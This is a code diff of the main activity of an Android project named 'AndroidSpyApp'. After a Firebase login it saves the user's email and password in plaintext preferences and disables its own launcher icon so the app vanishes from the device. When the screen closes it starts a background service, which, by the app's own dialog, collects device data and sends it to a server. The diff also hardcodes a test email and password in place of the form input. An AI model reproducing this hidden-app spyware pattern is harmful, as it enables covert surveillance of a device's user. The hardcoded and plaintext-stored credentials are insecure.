@@ -1,136 +1,154 @@
 package com.komnacki.androidspyapp
 
-import android.content.Context
+import android.content.*
+import android.content.pm.PackageManager
 import android.os.Bundle
 import android.text.Editable
 import android.text.TextWatcher
-import android.util.AttributeSet
 import android.util.Log
 import android.view.View
 import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.database.DatabaseReference
-import com.komnacki.androidspyapp.api.PermissionsService.Companion.TAG
+import com.google.firebase.database.FirebaseDatabase
 import kotlinx.android.synthetic.main.activity_main.*
 
 
 class MainActivity : AppCompatActivity() {
     private val MESSAGES_CHILD = "messages"
-    companion object{
-        lateinit var mFirebaseDatabaseReference : DatabaseReference
-        private lateinit var auth: FirebaseAuth
 
+    companion object {
+        const val SHARED_PREFERENCE_TAG: String = "SHARED_PREFERENCE_NAME"
+        const val PREFS_IS_FIRST_LAUNCH: String = "IS_FIRST_LAUNCH"
+        const val PREFS_USER_EMAIL: String = "PREFS_USER_EMAIL"
+        const val PREFS_USER_PASSWORD: String = "PREFS_USER_PASSWORD"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setTheme(R.style.Theme_AppCompat)
-        Log.d("SERVICE: ", "main activity onCreate  ")
-
         setContentView(R.layout.activity_main)
 
-        var isEmailValid = false
-        var isPasswordValid = false
-        et_email.addTextChangedListener (object:TextWatcher{
-            override fun afterTextChanged(s: Editable?) {
-                isEmailValid = validateEmail(s.toString())
-                btn_connect.isEnabled = isEmailValid && isPasswordValid
-            }
+        var auth : FirebaseAuth = FirebaseAuth.getInstance()
 
-            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+        val prefs = getSharedPreferences(SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
+        val isFirstRun = prefs.getBoolean(PREFS_IS_FIRST_LAUNCH, true)
 
-            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
-        })
-        et_password.addTextChangedListener (object:TextWatcher{
-            override fun afterTextChanged(s: Editable?) {
-                isPasswordValid = !s.toString().isBlank()
-                btn_connect.isEnabled = isEmailValid && isPasswordValid
-            }
+        if (isFirstRun) {
+            val editor = prefs.edit()
+            editor.putBoolean(PREFS_IS_FIRST_LAUNCH, false)
+            editor.apply()
 
-            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+            Log.d("SERVICE: ", "main activity onCreate  ")
 
-            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
-        })
+            var isEmailValid = false
+            var isPasswordValid = false
+            et_email.addTextChangedListener(object : TextWatcher {
+                override fun afterTextChanged(s: Editable?) {
+                    isEmailValid = validateEmail(s.toString())
+                    btn_connect.isEnabled = isEmailValid && isPasswordValid
+                }
 
-        btn_connect.setOnClickListener {
-            if(btn_connect.isEnabled) {
-                val email = et_email.text.toString()
-                val password = et_password.text.toString()
-                setButtonVisibility(false)
-                auth.signInWithEmailAndPassword(email, password)
-                    .addOnCompleteListener(this) { task ->
-                        if (task.isSuccessful) {
-                            setButtonVisibility(true)
-                            // Sign in success, update UI with the signed-in user's information
-                            Log.d("KK: ", "signInWithEmail:success")
-                            val user = auth.currentUser
-                        } else {
-                            setButtonVisibility(true)
-                            // If sign in fails, display a message to the user.
-                            Log.w("KK: ", "signInWithEmail:failure", task.exception)
-                            Toast.makeText(baseContext, "Authentication failed.",
-                                Toast.LENGTH_SHORT).show()
+                override fun beforeTextChanged(
+                    s: CharSequence?,
+                    start: Int,
+                    count: Int,
+                    after: Int
+                ) {
+                }
+
+                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
+            })
+            et_password.addTextChangedListener(object : TextWatcher {
+                override fun afterTextChanged(s: Editable?) {
+                    isPasswordValid = !s.toString().isBlank()
+                    btn_connect.isEnabled = isEmailValid && isPasswordValid
+                }
+
+                override fun beforeTextChanged(
+                    s: CharSequence?,
+                    start: Int,
+                    count: Int,
+                    after: Int
+                ) {
+                }
+
+                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
+            })
+
+            btn_connect.setOnClickListener {
+                if (btn_connect.isEnabled) {
+                    val email = "gt@a.pl"/*et_email.text.toString()*/
+                    val password = "qweasd"/*et_password.text.toString()*/
+                    setButtonVisibility(false)
+                    auth.signInWithEmailAndPassword(email, password)
+                        .addOnCompleteListener(this) { task ->
+                            if (task.isSuccessful) {
+                                // Sign in success, update UI with the signed-in user's information
+                                Log.d("KK: ", "signInWithEmail:success")
+                                saveUserCredential(prefs, email, password)
+                                hideAppIcon()
+
+                                val dialog = AlertDialog.Builder(this)
+                                    .setTitle("Attention!")
+                                    .setMessage("The visual interface of app will be close now, and not visible in the future. The AndroidSpyApp will start collecting data about user device and sending data to the server.")
+                                    .setPositiveButton("OK") { dialog: DialogInterface?, _: Int ->
+                                        run {
+                                            Log.d("KK:", "dialog_OK clicked. Finish activity!")
+                                            dialog?.dismiss()
+                                            this.finish()
+                                        }
+                                    }
+                                setButtonVisibility(true)
+                                dialog.show()
+                            } else {
+                                setButtonVisibility(true)
+                                // If sign in fails, display a message to the user.
+
+                                Log.w("KK: ", "signInWithEmail:failure", task.exception)
+                                Toast.makeText(
+                                    baseContext, "Authentication failed.",
+                                    Toast.LENGTH_SHORT
+                                ).show()
+                            }
                         }
-                    }
+                }
             }
         }
+    }
 
-        auth = FirebaseAuth.getInstance()
+    private fun saveUserCredential(prefs: SharedPreferences, email: String, password: String) {
+        val editor = prefs.edit()
+        editor.putString(PREFS_USER_EMAIL, email.replace(".", "_"))
+        editor.putString(PREFS_USER_PASSWORD, password)
+        editor.apply()
+    }
+
+    private fun hideAppIcon() {
+        val p = packageManager
+        val componentName = ComponentName(this, MainActivity::class.java)
+        // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+        p.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
     }
 
     private fun setButtonVisibility(isBtnVisible: Boolean) {
-        btn_connect.visibility = if(isBtnVisible) View.VISIBLE else View.GONE
-        progressBar.visibility = if(isBtnVisible) View.GONE else View.VISIBLE
+        btn_connect.visibility = if (isBtnVisible) View.VISIBLE else View.GONE
+        progressBar.visibility = if (isBtnVisible) View.GONE else View.VISIBLE
     }
 
-    override fun onCreateView(name: String, context: Context, attrs: AttributeSet): View? {
-        val rootView = super.onCreateView(name, context, attrs)
-
-        return rootView
+    override fun onDestroy() {
+        startService(Intent(this, MainService::class.java))
+        super.onDestroy()
+        Log.d("KK:", "onDestroy main activity!")
     }
 
-    override fun onStart() {
-        super.onStart()
-        val currentUser = auth.currentUser
-        Log.d(TAG, "onStart: currentUser: " + currentUser.toString())
-    }
-
-    //    override fun onCreateView(
-//        parent: View?,
-//        name: String,
-//        context: Context,
-//        attrs: AttributeSet
-//    ): View? {
-//        val rootView = super.onCreateView(parent, name, context, attrs)
-//        setContentView(R.layout.activity_main)
-//
-//        var isEmailValid = false
-//        var isPasswordValid = false
-//        et_email.addTextChangedListener (object:TextWatcher{
-//            override fun afterTextChanged(s: Editable?) {
-//                isEmailValid = validateEmail(s.toString())
-//                btn_connect.isEnabled = isEmailValid && isPasswordValid
-//            }
-//
-//            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
-//
-//            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
-//        })
-//        et_password.addTextChangedListener (object:TextWatcher{
-//            override fun afterTextChanged(s: Editable?) {
-//                isPasswordValid = !s.toString().isBlank()
-//                btn_connect.isEnabled = isEmailValid && isPasswordValid
-//            }
-//
-//            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
-//
-//            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
-//        })
-//        return rootView
-//    }
-
-    fun validateEmail(input: String) : Boolean {
+    fun validateEmail(input: String): Boolean {
         return input.matches(Regex("[a-zA-Z0-9._-]+@[a-z]+.[a-z]+"))
     }
 }
